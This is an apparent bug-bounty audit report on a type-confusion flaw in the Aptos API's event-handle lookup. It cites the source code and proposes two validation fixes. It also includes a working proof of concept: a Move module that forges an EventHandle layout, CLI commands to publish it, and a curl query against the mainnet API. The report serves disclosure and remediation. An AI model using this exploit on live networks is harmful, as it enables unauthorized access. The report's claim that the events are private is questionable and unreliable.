# Audit Report

## Title
Type Confusion in Event Handle Retrieval Allows Cross-Account Event Access

## Summary
The `get_events_by_event_handle()` API endpoint in `api/src/events.rs` allows an attacker to access events from arbitrary accounts by crafting a malicious Move struct that deserializes as an `EventHandle` with a controlled `EventKey`. The API performs no validation that the retrieved field is actually of type `EventHandle` or that the embedded `EventKey` belongs to the queried account.

## Finding Description

The vulnerability exists in the event retrieval flow between two files: [1](#0-0) [2](#0-1) 

The `find_event_key()` function retrieves a resource field as a `MoveValue`, serializes it to bytes, then attempts BCS deserialization as an `EventHandle`. The critical flaw is that BCS deserialization succeeds for any data structure matching the binary layout, regardless of the actual Move type.

The `EventHandle` structure has the following Rust representation: [3](#0-2) 

With `EventKey` defined as: [4](#0-3) 

This BCS-serializes as: `[u64 count][u64 creation_number][32-byte address]`.

An attacker can publish a Move module containing:
```move
module attacker::exploit {
    struct FakeHandle has store {
        fake_count: u64,
        target_creation_num: u64,
        target_address: address,
    }
    
    struct MaliciousResource has key {
        withdraw_events: FakeHandle,
    }
}
```

When the API queries this resource:
1. `find_resource()` retrieves the `MaliciousResource` at the attacker's address
2. The `withdraw_events` field is extracted as a `MoveValue`
3. Serialization produces bytes with identical layout to `EventHandle`
4. BCS deserialization succeeds, treating `FakeHandle` as `EventHandle`
5. The API returns events for the controlled `EventKey(target_creation_num, target_address)`

The attacker can set `target_address` to any victim account and `target_creation_num` to match the victim's event stream, successfully accessing private event data.

## Impact Explanation

This vulnerability qualifies as **High Severity** per Aptos Bug Bounty criteria:

1. **Unauthorized Event Access**: Attackers can read events from any account's resources without authorization
2. **Privacy Violation**: Events often contain sensitive transaction details (amounts, recipients, internal state changes)
3. **Access Control Bypass**: The API is designed to return events only for resources at the queried address, but this bypasses that restriction
4. **No Authentication Required**: Any user who can publish a Move module can exploit this

While this doesn't directly cause loss of funds or consensus violations, it represents a significant protocol violation that undermines the event system's security model and could expose confidential transaction patterns.

## Likelihood Explanation

**Likelihood: High**

- **Ease of Exploitation**: Requires only publishing a malicious Move module (low barrier)
- **No Special Privileges**: Any account can publish modules and call the API
- **Reliable Exploitation**: The BCS deserialization is deterministic and always succeeds for matching layouts
- **Difficult to Detect**: The API returns valid responses, making the attack indistinguishable from legitimate queries

The attack is practical and requires minimal technical sophistication beyond understanding BCS serialization.

## Recommendation

Add type validation to verify that the retrieved field is actually of type `event::EventHandle<T>` before deserializing. The fix should occur in the `find_event_key()` function:

**Option 1: Validate field type against module metadata**
```rust
pub fn find_event_key(
    &self,
    struct_tag: MoveStructTag,
    field_name: Identifier,
) -> Result<EventKey, BasicErrorWith404> {
    let struct_tag: StructTag = (&struct_tag).try_into()?;
    
    // Get the resource and field
    let (_, resource) = self.find_resource(&struct_tag)?;
    let (_id, value) = resource
        .into_iter()
        .find(|(id, _)| id == &field_name)
        .ok_or_else(|| struct_field_not_found(...))?;
    
    // NEW: Validate field type by checking module metadata
    let state_view = self.context.latest_state_view_poem(&self.latest_ledger_info)?;
    let converter = state_view.as_converter(...);
    let module = converter.view_existing_module(&struct_tag.module_id())
        .map_err(|e| /* handle error */)?;
    
    // Verify the field type is EventHandle from aptos_framework::event
    let field_type = get_field_type_from_module(&module, &struct_tag, &field_name)?;
    if !is_event_handle_type(&field_type) {
        return Err(BadRequest("Field is not an EventHandle type"));
    }
    
    // Continue with existing deserialization
    let event_handle: EventHandle = bcs::from_bytes(&bcs::to_bytes(&value)?)?;
    Ok(*event_handle.key())
}
```

**Option 2: Validate EventKey account matches queried address**
```rust
let event_handle: EventHandle = bcs::from_bytes(&event_handle_bytes)?;

// NEW: Verify EventKey belongs to the queried account
if event_handle.key().get_creator_address() != *self.address.inner() {
    return Err(BasicErrorWith404::bad_request_with_code(
        "EventKey does not belong to the queried account",
        AptosErrorCode::InvalidInput,
        &self.latest_ledger_info,
    ));
}

Ok(*event_handle.key())
```

**Recommended: Implement both checks** for defense-in-depth.

## Proof of Concept

**Step 1: Create malicious Move module** (`sources/exploit.move`):
```move
module attacker::exploit {
    use std::signer;
    
    struct FakeHandle has store {
        fake_count: u64,
        target_creation: u64,
        target_addr: address,
    }
    
    struct ExploitResource has key {
        withdraw_events: FakeHandle,
    }
    
    public entry fun publish_exploit(account: &signer, victim: address, creation: u64) {
        move_to(account, ExploitResource {
            withdraw_events: FakeHandle {
                fake_count: 0,
                target_creation: creation,
                target_addr: victim,
            }
        });
    }
}
```

**Step 2: Deploy and exploit**:
```bash
# Publish module
aptos move publish --named-addresses attacker=0xATTACKER

# Create exploit resource pointing to victim's CoinStore withdraw_events
aptos move run \
  --function-id 0xATTACKER::exploit::publish_exploit \
  --args address:0xVICTIM u64:2

# Query API to retrieve victim's events through attacker's resource
curl "https://fullnode.mainnet.aptoslabs.com/v1/accounts/0xATTACKER/events/0xATTACKER::exploit::ExploitResource/withdraw_events"
```

**Expected Result**: The API returns events from `0xVICTIM`'s `0x1::coin::CoinStore<AptosCoin>` withdraw events (creation_number=2), despite querying the attacker's address.

**Note**: The exact `creation_number` can be discovered by querying the victim's account resources and examining legitimate EventHandles, or through trial and error.

### Citations

**File:** api/src/events.rs (L101-150)
```rust
    async fn get_events_by_event_handle(
        &self,
        accept_type: AcceptType,
        /// Hex-encoded 32 byte Aptos account, with or without a `0x` prefix, for
        /// which events are queried. This refers to the account that events were
        /// emitted to, not the account hosting the move module that emits that
        /// event type.
        address: Path<Address>,
        /// Name of struct to lookup event handle e.g. `0x1::account::Account`
        event_handle: Path<MoveStructTag>,
        /// Name of field to lookup event handle e.g. `withdraw_events`
        field_name: Path<IdentifierWrapper>,
        /// Starting sequence number of events.
        ///
        /// If unspecified, by default will retrieve the most recent
        start: Query<Option<U64>>,
        /// Max number of events to retrieve.
        ///
        /// If unspecified, defaults to default page size
        limit: Query<Option<u16>>,
    ) -> BasicResultWith404<Vec<VersionedEvent>> {
        event_handle
            .0
            .verify(0)
            .context("'event_handle' invalid")
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code_no_info(err, AptosErrorCode::InvalidInput)
            })?;
        verify_field_identifier(field_name.as_str())
            .context("'field_name' invalid")
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code_no_info(err, AptosErrorCode::InvalidInput)
            })?;
        fail_point_poem("endpoint_get_events_by_event_handle")?;
        self.context
            .check_api_output_enabled("Get events by event handle", &accept_type)?;
        let page = Page::new(
            start.0.map(|v| v.0),
            limit.0,
            self.context.max_events_page_size(),
        );

        let api = self.clone();
        api_spawn_blocking(move || {
            let account = Account::new(api.context.clone(), address.0, None, None, None)?;
            let key = account.find_event_key(event_handle.0, field_name.0.into())?;
            api.list(account.latest_ledger_info, accept_type, page, key)
        })
        .await
    }
```

**File:** api/src/accounts.rs (L588-644)
```rust
    pub fn find_event_key(
        &self,
        struct_tag: MoveStructTag,
        field_name: Identifier,
    ) -> Result<EventKey, BasicErrorWith404> {
        // Parse the struct tag
        let struct_tag: StructTag = (&struct_tag)
            .try_into()
            .context("Given event handle was invalid")
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code(
                    err,
                    AptosErrorCode::InvalidInput,
                    &self.latest_ledger_info,
                )
            })?;

        // Find the resource and retrieve the struct field
        let (_, resource) = self.find_resource(&struct_tag)?;
        let (_id, value) = resource
            .into_iter()
            .find(|(id, _)| id == &field_name)
            .ok_or_else(|| {
                struct_field_not_found(
                    self.address,
                    &struct_tag,
                    &field_name,
                    self.ledger_version,
                    &self.latest_ledger_info,
                )
            })?;

        // Deserialize the event handle to retrieve the key
        let event_handle_bytes = bcs::to_bytes(&value)
            .context("Failed to serialize event handle from storage")
            .map_err(|err| {
                BasicErrorWith404::internal_with_code(
                    err,
                    AptosErrorCode::InternalError,
                    &self.latest_ledger_info,
                )
            })?;
        // Deserialization may fail because the bytes are not EventHandle struct type.
        let event_handle: EventHandle = bcs::from_bytes(&event_handle_bytes)
            .context(format!(
                "Deserialization error, field({}) type is not a EventHandle struct",
                field_name
            ))
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code(
                    err,
                    AptosErrorCode::InvalidInput,
                    &self.latest_ledger_info,
                )
            })?;
        Ok(*event_handle.key())
    }
```

**File:** types/src/event.rs (L12-16)
```rust
#[derive(Clone, Copy, Debug, Deserialize, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize)]
pub struct EventKey {
    creation_number: u64,
    account_address: AccountAddress,
}
```

**File:** types/src/event.rs (L86-92)
```rust
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct EventHandle {
    /// Number of events in the event stream.
    count: u64,
    /// The associated globally unique key that is used as the key to the EventStore.
    key: EventKey,
}
```
